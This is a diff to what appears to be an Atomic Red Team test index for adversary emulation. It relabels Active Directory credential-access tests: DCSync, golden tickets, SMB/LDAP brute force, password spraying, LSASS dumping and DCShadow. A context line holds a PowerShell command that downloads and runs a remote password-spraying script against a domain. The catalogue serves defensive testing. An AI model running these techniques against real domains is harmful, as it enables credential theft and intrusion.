@@ -1486,10 +1486,10 @@ credential-access:
       - Windows
       identifier: T1003.006
     atomic_tests:
-    - name: DCSync
+    - name: DCSync (Active Directory)
       auto_generated_guid: 129efd28-8497-4c87-a1b0-73b9a870ca3e
       description: |
-        Attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
+        Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
         Works against a remote Windows Domain Controller using the replication protocol.
         Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
         [Reference](https://adsecurity.org/?p=1729)
@@ -1497,7 +1497,7 @@ credential-access:
       - windows
       input_arguments:
         domain:
-          description: Targeted domain
+          description: Targeted Active Directory domain
           type: string
           default: example.com
         user:
@@ -1965,10 +1965,10 @@ credential-access:
       - Windows
       identifier: T1558.001
     atomic_tests:
-    - name: Crafting golden tickets with mimikatz
+    - name: Crafting Active Directory golden tickets with mimikatz
       auto_generated_guid: 9726592a-dabc-4d4d-81cd-44070008b3af
       description: |
-        Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the domain.
+        Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.
         This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).
         The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
       supported_platforms:
@@ -1980,7 +1980,7 @@ credential-access:
           type: string
           default: S-1-5-21-DEFAULT
         domain:
-          description: Targeted domain FQDN
+          description: Targeted Active Directory domain FQDN
           type: string
           default: example.com
         account:
@@ -4334,10 +4334,10 @@ credential-access:
       - Containers
       identifier: T1110.001
     atomic_tests:
-    - name: Brute Force Credentials of all domain users via SMB
+    - name: Brute Force Credentials of all Active Directory domain users via SMB
       auto_generated_guid: '09480053-2f98-4854-be6e-71ae5f672224'
       description: 'Creates username and password files then attempts to brute force
-        on remote host
+        Active Directory accounts on remote host
 
 '
       supported_platforms:
@@ -4358,7 +4358,8 @@ credential-access:
           type: String
           default: "\\\\COMPANYDC1\\IPC$"
         domain:
-          description: Domain name of the target system we will brute force upon
+          description: Active Directory domain name of the target system we will brute
+            force upon
           type: String
           default: YOUR_COMPANY
       executor:
@@ -4372,11 +4373,11 @@ credential-access:
         cleanup_command: |-
           del #{input_file_users}
           del #{input_file_passwords}
-    - name: Brute Force Credentials of single domain user via LDAP against domain
-        controller (NTLM or Kerberos)
+    - name: Brute Force Credentials of single Active Directory domain user via LDAP
+        against domain controller (NTLM or Kerberos)
       auto_generated_guid: c2969434-672b-4ec8-8df0-bbb91f40e250
-      description: 'Attempt to brute force domain user on a domain controller, via
-        LDAP, with NTLM or Kerberos
+      description: 'Attempt to brute force Active Directory domain user on a domain
+        controller, via LDAP, with NTLM or Kerberos
 
 '
       supported_platforms:
@@ -4391,7 +4392,7 @@ credential-access:
           type: String
           default: Password1`n1q2w3e4r`nPassword!
         domain:
-          description: Domain FQDN
+          description: Active Directory domain FQDN
           type: String
           default: contoso.com
         auth:
@@ -4622,11 +4623,11 @@ credential-access:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
-    - name: Password spray all domain users with a single password via LDAP against
-        domain controller (NTLM or Kerberos)
+    - name: Password spray all Active Directory domain users with a single password
+        via LDAP against domain controller (NTLM or Kerberos)
       auto_generated_guid: f14d956a-5b6e-4a93-847f-0c415142f07d
       description: |
-        Attempt to brute force all domain user with a single password (called "password spraying") on a domain controller, via LDAP, with NTLM or Kerberos
+        Attempt to brute force all Active Directory domain users with a single password (called "password spraying") on a domain controller, via LDAP, with NTLM or Kerberos
 
         Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)
       supported_platforms:
@@ -15439,6 +15440,7 @@ privilege-escalation:
       auto_generated_guid: 3203ad24-168e-4bec-be36-f79b13ef8a83
       description: |
         Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).
+        Especially useful against domain controllers in Active Directory environments.
         It must be executed in the context of a user who is privileged on remote `machine`.
 
         The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>
@@ -31146,6 +31148,7 @@ defense-evasion:
       auto_generated_guid: 3203ad24-168e-4bec-be36-f79b13ef8a83
       description: |
         Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).
+        Especially useful against domain controllers in Active Directory environments.
         It must be executed in the context of a user who is privileged on remote `machine`.
 
         The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>
@@ -32317,10 +32320,10 @@ defense-evasion:
       x_mitre_version: '2.0'
       identifier: T1207
     atomic_tests:
-    - name: DCShadow - Mimikatz
+    - name: DCShadow (Active Directory)
       auto_generated_guid: 0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6
       description: |
-        Use Mimikatz DCShadow method to simulate behavior of a Domain Controller and edit protected attribute.
+        Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.
 
         [DCShadow](https://www.dcshadow.com/)
         [Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)
